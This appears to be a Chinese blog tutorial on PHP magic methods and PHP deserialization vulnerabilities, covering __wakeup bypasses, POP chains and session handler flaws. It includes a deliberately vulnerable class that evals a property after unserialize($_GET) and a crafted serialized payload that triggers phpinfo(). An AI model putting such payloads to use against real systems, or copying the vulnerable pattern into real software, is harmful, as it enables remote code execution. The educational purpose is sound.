<h4 id="call"><a href="#call" class="headerlink" title="__call"></a>__call</h4><p>在对象中调用一个不可访问方法时，<code>__call()</code> 会被调用。也就是说你调用了一个对象中不存在的方法，就会触发。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$arg1</span>,<span class="subst">$arg2</span>[0]&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$test</span>-&gt;<span class="title function_ invoke__">callxxx</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">callxxx,a</span><br></pre></td></tr></table></figure>

<p>可以看到**__call**需要定义两个参数，一个是表示调用的函数名，一般开发会在这里报错写xxx不存在这个函数，第二个参数是传入的数组，这里只传入了一个a。</p>
<hr>
<h4 id="callStatic"><a href="#callStatic" class="headerlink" title="__callStatic"></a>__callStatic</h4><p>在静态上下文中调用一个不可访问方法时，<code>__callStatic()</code> 会被调用。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">__callStatic</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$arg1</span>,<span class="subst">$arg2</span>[0]&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$test</span>::<span class="title function_ invoke__">callxxx</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">callxxx,a</span><br></pre></td></tr></table></figure>

<p>这里先来学习一下双冒号的用法，双冒号也叫做范围解析操作符（也可称作 Paamayim Nekudotayim）或者更简单地说是一对冒号，可以用于访问静态成员，类常量，还可以用于覆盖类中的属性和方法。自 PHP 5.3.0 起，可以通过变量来引用类，该变量的值不能是关键字（如 <strong>self</strong>，<strong>parent</strong> 和 <strong>static</strong>）。与**__call<strong>不同的是需要添加</strong>static**，只有访问不存在的静态方法才会触发。</p>
<hr>
<h4 id="get"><a href="#get" class="headerlink" title="__get"></a>__get</h4><p>读取不可访问属性的值时，<code>__get()</code> 会被调用。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var1</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$arg1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$test</span>-&gt;var2;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">var2</span><br></pre></td></tr></table></figure>

<p><code>__get</code>魔术方法需要一个参数，这个参数代表着访问不存在的属性值。</p>
<hr>
<h4 id="set"><a href="#set" class="headerlink" title="__set"></a>__set</h4><p>给不可访问属性赋值时，<code>__set()</code> 会被调用。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var1</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$arg1</span>.<span class="string">&#x27;,&#x27;</span>.<span class="variable">$arg2</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$test</span>-&gt;var2=<span class="number">1</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">var2,<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p><strong>set</strong>跟<strong>get</strong>相反，一个是访问不存在的属性，一个是给不存在的属性赋值。</p>
<hr>
<p>__isset</p>
<p>对<strong>不可访问属性</strong>（比如private的属性）调用 <strong>isset()</strong> 或 <strong>empty()</strong> 时，<code>__isset()</code> 会被调用。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$arg1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$arg1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$test</span>-&gt;var1);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">var1</span><br></pre></td></tr></table></figure>

<p>该魔术方法使用了<strong>isset()<strong>或者</strong>empty()<strong>只要属性是</strong>private</strong>或者不存在的都会触发。</p>
<hr>
<h4 id="unset"><a href="#unset" class="headerlink" title="__unset"></a>__unset</h4><p>对不可访问属性调用 <strong>unset()</strong> 时，**__unset()** 会被调用。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$arg1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$arg1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$test</span>-&gt;var1);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">var1</span><br></pre></td></tr></table></figure>

<p>如果一个类定义了魔术方法 <code>__unset()</code> ，那么我们就可以使用 <strong>unset()</strong> 函数来销毁类的私有的属性，或在销毁一个不存在的属性时得到通知。</p>
<hr>
<h4 id="sleep"><a href="#sleep" class="headerlink" title="__sleep"></a>__sleep</h4><p><strong>serialize()</strong> 函数会检查类中是否存在一个魔术方法 <code>__sleep()</code>。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。对象被序列化之前触发，返回需要被序列化存储的成员属性，删除不必要的属性。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">SITE</span> = <span class="string">&#x27;uusama&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$nickname</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;nickname = <span class="variable">$nickname</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 重载序列化调用的方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 返回需要序列化的变量名，过滤掉password变量</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;nickname&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>);</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到执行序列化之前会先执行<strong>sleep()函数，上面</strong>sleep的函数作用是过滤掉password的变量值。</p>
<hr>
<h4 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup"></a>__wakeup</h4><p>unserialize() 会检查是否存在一个<code>__wakeup()</code>方法。如果存在，则会先调用 <code>__wakeup()</code> 方法，预先准备对象需要的资源。</p>
<p>预先准备对象资源，返回void，常用于反序列化操作中重新建立数据库连接或执行其他初始化操作。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">SITE</span> = <span class="string">&#x27;uusama&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$nickname</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;nickname = <span class="variable">$nickname</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义反序列化后调用的方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user_ser</span> = <span class="string">&#x27;O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;a&quot;;s:8:&quot;nickname&quot;;s:1:&quot;b&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$user_ser</span>));</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span>#1 (4) </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$username</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;a&quot;</span></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$nickname</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;b&quot;</span></span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$password</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;a&quot;</span></span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$order</span> =&gt;</span><br><span class="line">  <span class="literal">NULL</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到执行反序列化之前会先执行<strong>wakeup()函数，上面</strong>wakeup的函数作用是将username的变量值赋值给password变量。</p>
<hr>
<h4 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString"></a>__toString</h4><p><strong>__toString()</strong> 方法用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。此方法必须返回一个字符串，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="string">&#x27;__toString test&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$test</span>;</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">__toString</span><br></pre></td></tr></table></figure>

<p>特别注意__toString的触发条件，引用k0rz3n师傅的笔记：</p>
<blockquote>
<p>(1)echo ($obj) &#x2F; print($obj) 打印时会触发 (2)反序列化对象与字符串连接时 (3)反序列化对象参与格式化字符串时 (4)反序列化对象与字符串进行&#x3D;&#x3D;比较时（PHP进行&#x3D;&#x3D;比较的时候会转换参数类型） (5)反序列化对象参与格式化SQL语句，绑定参数时 (6)反序列化对象在经过php字符串函数，如 strlen()、addslashes()时 (7)在in_array()方法中，第一个参数是反序列化对象，第二个参数的数组中有toString返回的字符串的时候toString会被调用 (8)反序列化的对象作为 class_exists() 的参数的时候</p>
</blockquote>
<hr>
<h4 id="invoke"><a href="#invoke" class="headerlink" title="__invoke"></a>__invoke</h4><p>当尝试以调用函数的方式调用一个对象时，<code>__invoke()</code> 方法会被自动调用。(本特性只在 PHP 5.1.0 及以上版本有效。)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&#x27;__invoke test&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$test</span>();</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">__invoke test</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="clone"><a href="#clone" class="headerlink" title="__clone"></a>__clone</h4><p>当使用 clone 关键字拷贝完成一个对象后，新对象会自动调用定义的魔术方法 <code>__clone()</code> ，如果该魔术方法存在的话。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__clone test&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$newclass</span> = <span class="keyword">clone</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">__clone test</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="wakeup-函数绕过漏洞原理"><a href="#wakeup-函数绕过漏洞原理" class="headerlink" title="__wakeup()函数绕过漏洞原理"></a>__wakeup()函数绕过漏洞原理</h3><h4 id="1-低版本的php"><a href="#1-低版本的php" class="headerlink" title="1.低版本的php"></a>1.低版本的php</h4><blockquote>
<p><code>当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行。</code></p>
<p><code>从而绕过了__wakeup()函数</code></p>
</blockquote>
<h4 id="2-高一些的版本"><a href="#2-高一些的版本" class="headerlink" title="2.高一些的版本"></a>2.高一些的版本</h4><p>举个例子，</p>
<blockquote>
<p><code>C:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code></p>
<p><code>O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code></p>
</blockquote>
<p>关键是把<code>O:</code>改成<code>C:</code>，</p>
<p><strong>原理是</strong></p>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">C:</span>代表这个类实现了serializeable接口，而serializeable不支持__wakeup，就绕过去了</span><br></pre></td></tr></table></figure>

<h3 id="popchain"><a href="#popchain" class="headerlink" title="*popchain"></a>*popchain</h3><blockquote>
<p>实际环境中不可能存在直接反序列化就能实现命令执行的情况，这个时候就要用到我们刚学到的一些<code>魔术方法</code>的相互触发，来构造一条popchain，从反序列化接口开始，<strong>一级一级的触发</strong>【所以就需要清楚各个魔术方法的触发情况】，最终到达我们目的想要执行的<code>方法/函数</code></p>
</blockquote>
<hr>
<h3 id="个人-一些文章对-php反序列化的一些认知"><a href="#个人-一些文章对-php反序列化的一些认知" class="headerlink" title="*个人+一些文章对 php反序列化的一些认知"></a>*个人+一些文章对 php反序列化的一些认知</h3><p>举例</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">index</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test = <span class="keyword">new</span> <span class="title function_ invoke__">normal</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test-&gt;<span class="title function_ invoke__">action</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">normal</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;please attack me&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;test2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>正常实例化后会执行<code>normal</code>类里面的<code>action</code>方法，但是<code>unserialize</code>函数是可控的，我们就可以对其进行攻击，思路就是改变<code>index</code>类里面<code>test</code>属性的值，让它实例化<code>evil</code>类，从而执行<code>evil</code>里面的<code>action</code>方法，同时我们也要修改<code>evil</code>类里面的<code>test2</code>属性的值</p>
<hr>
<p>因为<code>类不同于函数</code>，<code>定义完之后无法直接使用</code>，因为类<code>只是一个抽象的概念</code>，<u><strong>需要通过关键字new来实例化类，才可以使用</strong></u>。类实例化的语法格式如下：<strong>变量名&#x3D;new 类名（[构造函数]）</strong>。</p>
<p>其中，变量名可以为<strong>任何PHP变量的名称</strong>，构造参数取决于<strong>类的构造函数</strong>，若<strong>无构造函数，则圆括号中为空</strong>。</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">实例化一个类后即可使用该类</span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">index</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test = <span class="keyword">new</span> <span class="title function_ invoke__">evil</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test2</span> = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>= <span class="keyword">new</span> <span class="title function_ invoke__">index</span>();</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;serialize1.txt&#x27;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>

<p>这里反序化的，先是</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span>= <span class="keyword">new</span> <span class="title function_ invoke__">index</span>();</span><br></pre></td></tr></table></figure>

<p>实例化index()类，然后调动其<code>test</code>变量实例化<code>evil)()</code>，</p>
<p>使其能够被调用，然后根据</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;test2);</span><br></pre></td></tr></table></figure>

<p>我们对<code>test2</code>变量进行赋值命令语句，使得我们可以利用其中的<code>eval</code>函数，执行一些命令来拿到我们所需要的内容</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="variable">$test2</span> = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>最后对序列化的<strong>入口类</strong>(<code>index.php</code>)序列化，然后把序列化结果导入，再由源码中反序列化函数后，从而实现我们想要的结构</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>比如这里就是以<code>GET</code>方式传参<code>test</code>参数，</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">url/?<span class="attribute">test</span>=序列化结果</span><br></pre></td></tr></table></figure>

<p><strong>但是序列化的结果未必都是没有问题的，因为<code>%00</code>这个空字符是无法显示，只能输入进去</strong></p>
<p>以上面为例子，序列化后结果为</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">5</span>:<span class="string">&quot;index&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">11</span>:<span class="string">&quot;indextest&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;evil&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;test2&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;phpinfo();&quot;</span>;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>如果用了这个是会报错的，</p>
<p><img src="/2022/05/28/Web-study/image-20220927091524021.png" alt="image-20220927091524021"></p>
<p>因为这里的参数有问题</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">&#123;<span class="variable">s:11</span>:<span class="string">&quot;indextest&quot;</span></span><br></pre></td></tr></table></figure>

<p>我们仔细看一下属性值是<code>11</code>，但是后面的<code>indextest</code>总共是<code>9</code>个字符，所以丢失了两个字符，这两个字符就是空字符<code>%00</code></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">5</span>:<span class="string">&quot;index&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">11</span>:<span class="string">&quot;index%00test%00&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;evil&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;test2&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;phpinfo();&quot;</span>;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>这里我们加上后再试试</p>
<p><img src="/2022/05/28/Web-study/image-20220927091556911.png" alt="image-20220927091556911"></p>
<p>就实现了我们的目的操作</p>
<p>当然其实还可能有的情况后面不是<code>eval()</code>的命令执行，可能是文件包含，或者其他操作，按这种思路走大都是没有问题的</p>
<h3 id="session的反序列化漏洞"><a href="#session的反序列化漏洞" class="headerlink" title="session的反序列化漏洞"></a>session的反序列化漏洞</h3><figure class="highlight autohotkey"><table><tr><td class="code"><pre><span class="line">session的反序列化漏洞，就是利用`php`处理器和`php_serialize`处理器的存储格式差异而产生，通过具体的代码我们来看下漏洞出现的原因</span><br></pre></td></tr></table></figure>



<h4 id="PHP-session序列化机制"><a href="#PHP-session序列化机制" class="headerlink" title="PHP session序列化机制"></a>PHP session序列化机制</h4><p>根据<code>php.ini</code>中的配置项，我们研究将<code>$_SESSION</code>中保存的所有数据序列化存储到<code>PHPSESSID</code>对应的文件中，使用的三种不同的处理格式，即<code>session.serialize_handler</code>定义的三种引擎：</p>
<table>
<thead>
<tr>
<th align="center">处理器</th>
<th align="center">对应的存储格式</th>
</tr>
</thead>
<tbody><tr>
<td align="center">php</td>
<td align="center">键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值</td>
</tr>
<tr>
<td align="center">php_binary</td>
<td align="center">键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 serialize() 函数反序列处理的值</td>
</tr>
<tr>
<td align="center">php_serialize (php&gt;&#x3D;5.5.4)</td>
<td align="center">经过 serialize() 函数反序列处理的数组</td>
</tr>
</tbody></table>
